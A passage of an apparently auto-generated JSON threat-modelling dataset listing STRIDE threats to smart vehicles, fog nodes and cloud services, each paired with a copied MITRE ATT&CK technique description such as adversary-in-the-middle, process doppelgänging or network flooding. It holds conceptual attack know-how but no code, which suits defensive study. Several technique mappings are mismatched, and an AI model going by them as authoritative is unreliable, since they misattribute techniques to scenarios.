                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "10",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a trusted smart vehicle to inject malicious data into fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes rely on weak or no mutual authentication with smart vehicles.",
                    "Role": "System architect",
                    "Condition": "Authentication mechanism is not robust."
                },
                {
                    "Assumption": "The attacker has access to the communication channel between smart vehicles and fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Physical proximity to the vehicles."
                },
                {
                    "Assumption": "The attacker considers the cost and rewards for spoofing worthwhile.",
                    "Role": "Attacker",
                    "Condition": "Target system has high value data or impact."
                }
            ],
            "Potential Impact": "Unauthorized data could corrupt decision-making processes, leading to traffic management disruptions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "impersonation",
                "network",
                "data injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker fakes the identity of a fog node to intercept and alter data being sent to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Mutual authentication between fog nodes and cloud services is misconfigured or easily bypassed.",
                    "Role": "System administrator",
                    "Condition": "Credentials or certificates are compromised."
                },
                {
                    "Assumption": "The attacker can access network communication paths between fog nodes and the cloud.",
                    "Role": "Attacker",
                    "Condition": "Insufficient network security controls are in place."
                },
                {
                    "Assumption": "Data transmitted between fog nodes and cloud services is not fully encrypted.",
                    "Role": "System architect",
                    "Condition": "Lack of encrypted communication channels."
                }
            ],
            "Potential Impact": "Sensitive data disclosure and integrity compromise, leading to misinformation in analytics.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "interception",
                "network",
                "data tampering"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Unauthorized access to RSUs by pretending to be a legitimate vehicle or fog node, leading to manipulated traffic signals.",
            "Assumptions": [
                {
                    "Assumption": "RSUs do not have strong mutual authentication with connected devices.",
                    "Role": "System designer",
                    "Condition": "Use of weak authentication protocols."
                },
                {
                    "Assumption": "An attacker has knowledge of communication protocols between RSUs and vehicles.",
                    "Role": "Attacker",
                    "Condition": "Protocol documentation is accessible."
                },
                {
                    "Assumption": "The attacker can transmit signals to or intercept communication with RSUs.",
                    "Role": "Attacker",
                    "Condition": "Proximity to communication endpoints."
                }
            ],
            "Potential Impact": "Manipulated traffic flow causing congestion or accidents.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "traffic manipulation",
                "network",
                "RSU"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the firmware on fog nodes to alter data processing rules.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates are not securely authenticated.",
                    "Role": "Firmware developer",
                    "Condition": "Use of insecure or outdated update mechanisms."
                },
                {
                    "Assumption": "The attacker can gain physical or remote access to the fog node.",
                    "Role": "Attacker",
                    "Condition": "Insufficient physical or network security controls."
                },
                {
                    "Assumption": "There is no integrity checking mechanism for firmware updates.",
                    "Role": "System integrator",
                    "Condition": "Lack of integrity checks."
                }
            ],
            "Potential Impact": "Corrupted decision-making processes within the fog nodes and compromised system integrity.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "network",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Data packets are intercepted and altered during transmission between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Transmission channels are not fully encrypted or use weak encryption.",
                    "Role": "Network administrator",
                    "Condition": "Use of weak or no encryption."
                },
                {
                    "Assumption": "Attackers have physical access to the communication medium.",
                    "Role": "Attacker",
                    "Condition": "Barriers to physical access are low."
                },
                {
                    "Assumption": "Data integrity verification measures are absent or weak.",
                    "Role": "System architect",
                    "Condition": "Lack of data integrity checks."
                }
            ],
            "Potential Impact": "Compromised data integrity affecting vehicular functions and traffic management.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "packet interception",
                "network",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Log files within fog nodes are altered to hide malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms do not have strong integrity protection.",
                    "Role": "System designer",
                    "Condition": "Logs are stored without sufficient security."
                },
                {
                    "Assumption": "An attacker has necessary privileges to access log files.",
                    "Role": "Attacker",
                    "Condition": "Privilege escalation or insider threat."
                },
                {
                    "Assumption": "There is inadequate monitoring for unauthorized log modifications.",
                    "Role": "Security officer",
                    "Condition": "Lack of log monitoring tools."
                }
            ],
            "Potential Impact": "Hindrance to incident response and forensic investigation.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "logs",
                "data integrity",
                "forensic evasion"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A rogue vehicle denies sending corrupt data that led to an accident.",
            "Assumptions": [
                {
                    "Assumption": "System lacks a robust non-repudiation mechanism.",
                    "Role": "System architect",
                    "Condition": "Absence of digital signatures or time-stamping."
                },
                {
                    "Assumption": "Vehicles have the capability to misreport or deny their actions.",
                    "Role": "Attacker",
                    "Condition": "Absence of authoritative action logs."
                },
                {
                    "Assumption": "Data logs are insufficient for accountability.",
                    "Role": "System integrator",
                    "Condition": "Logging lacks granularity or completeness."
                }
            ],
            "Potential Impact": "Difficulty attributing responsibility and enforcing accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "non-repudiation",
                "vehicle",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker disrupts log records on fog nodes to hide unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are insufficiently protected.",
                    "Role": "System administrator",
                    "Condition": "Logs are easily accessible or modifiable."
                },
                {
                    "Assumption": "The attacker has escalated privileges to modify logs.",
                    "Role": "Attacker",
                    "Condition": "Privilege escalation or insider threat."
                },
                {
                    "Assumption": "Log integrity verification mechanisms are missing.",
                    "Role": "System architect",
                    "Condition": "No integrity checks for logs."
                }
            ],
            "Potential Impact": "Obscured forensic evidence and hindrance in incident investigation.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log modification",
                "data integrity",
                "forensic evasion"
            ],
            "mitre_technique": {
                "name": "Process Doppelg\u00e4nging",
                "description": "Adversaries may inject malicious code into process via process doppelg\u00e4nging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelg\u00e4nging is a method of executing arbitrary code in the address space of a separate live process. \n\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)\n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)\n\nAdversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelg\u00e4nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelg\u00e4nging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)\n\nProcess Doppelg\u00e4nging is implemented in 4 steps (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017):\n\n* Transact \u2013 Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load \u2013 Create a shared section of memory and load the malicious executable.\n* Rollback \u2013 Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate \u2013 Create a process from the tainted section of memory and initiate execution.\n\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelg\u00e4nging may evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--7007935a-a8a7-4c0b-bd98-4e85be8ed197",
                "technique_id": "T1055.013"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Cloud services deny receipt of critical data from fog nodes during a system outage investigation.",
            "Assumptions": [
                {
                    "Assumption": "No proof of data transmission records between fog nodes and the cloud.",
                    "Role": "System integrator",
                    "Condition": "Lack of acknowledgment or receipt verification mechanisms."
                },
                {
                    "Assumption": "Reliability of communication logs is questionable.",
                    "Role": "System administrator",
                    "Condition": "Logs are insecure or incomplete."
                },
                {
                    "Assumption": "There is no automated non-repudiation service.",
                    "Role": "System architect",
                    "Condition": "Absence of cryptographic assurances."
                }
            ],
            "Potential Impact": "Challenges in diagnosing and attributing the cause of the outage.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "cloud service",
                "data transmission",
                "outage investigation"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts data flows between smart vehicles and fog nodes, gaining access to sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not end-to-end encrypted.",
                    "Role": "System architect",
                    "Condition": "Reliance on unencrypted protocols."
                },
                {
                    "Assumption": "The attacker can eavesdrop on the network.",
                    "Role": "Attacker",
                    "Condition": "Proximity to network communication paths or compromised nodes."
                },
                {
                    "Assumption": "Vehicles transmit sensitive data without additional security.",
                    "Role": "System designer",
                    "Condition": "Lack of data encryption at the source."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive vehicular data, including personal information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "interception",
                "network",
                "eavesdropping"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive vehicular data stored on fog nodes is accessed by unauthorized entities.",
            "Assumptions": [
                {
                    "Assumption": "Stored data on fog nodes is not encrypted.",
                    "Role": "System architect",
                    "Condition": "Data storage lacks encryption."
                },
                {
                    "Assumption": "The attacker has gained unauthorized access to the fog node.",
                    "Role": "Attacker",
                    "Condition": "Compromised access control mechanisms."
                },
                {
                    "Assumption": "Access control policies are not strictly enforced.",
                    "Role": "System administrator",
                    "Condition": "Lax monitoring and enforcement of access policies."
                }
            ],
            "Potential Impact": "Exposure of sensitive information leading to potential misuse or privacy violations.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data theft",
                "fog node",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Cloud storage services are breached, exposing long-term sensitive vehicular data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud data storage lacks sufficient encryption measures.",
                    "Role": "Cloud service provider",
                    "Condition": "Data is stored in plaintext or with weak encryption."
                },
                {
                    "Assumption": "Attackers can bypass cloud security controls.",
                    "Role": "Attacker",
                    "Condition": "Exploitation of cloud service vulnerabilities."
                },
                {
                    "Assumption": "There is no robust access management for cloud data.",
                    "Role": "Cloud administrator",
                    "Condition": "Weak IAM policies."
                }
            ],
            "Potential Impact": "Massive data breach with extensive exposure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud breach",
                "data theft",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack on fog nodes, rendering them unable to process and forward data.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have insufficient protection against high-volume traffic.",
                    "Role": "System administrator",
                    "Condition": "Lack of DDoS mitigation tools."
                },
                {
                    "Assumption": "The attacker has access to a botnet to generate traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to botnet infrastructure."
                },
                {
                    "Assumption": "Network monitoring is inadequate to detect and mitigate the traffic spike quickly.",
                    "Role": "Network operator",
                    "Condition": "Lax or delayed monitoring capabilities."
                }
            ],
            "Potential Impact": "Service disruption causing data processing delays and reduced system performance.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "network traffic",
                "fog node"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overwhelms the communication channels between smart vehicles and fog nodes, blocking critical data transmission.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not adequately protected against traffic overload.",
                    "Role": "Network architect",
                    "Condition": "Lack of redundancy and load balancing."
                },
                {
                    "Assumption": "The attacker can generate or simulate heavy traffic effectively.",
                    "Role": "Attacker",
                    "Condition": "Control over sufficient resources."
                },
                {
                    "Assumption": "Detection mechanisms for abnormal traffic patterns are weak or non-existent.",
                    "Role": "Security analyst",
                    "Condition": "Limited anomaly detection capabilities."
                }
            ],
            "Potential Impact": "Critical data is delayed or lost, disrupting real-time vehicular operations.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic overload",
                "network disruption",
                "smart vehicle"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
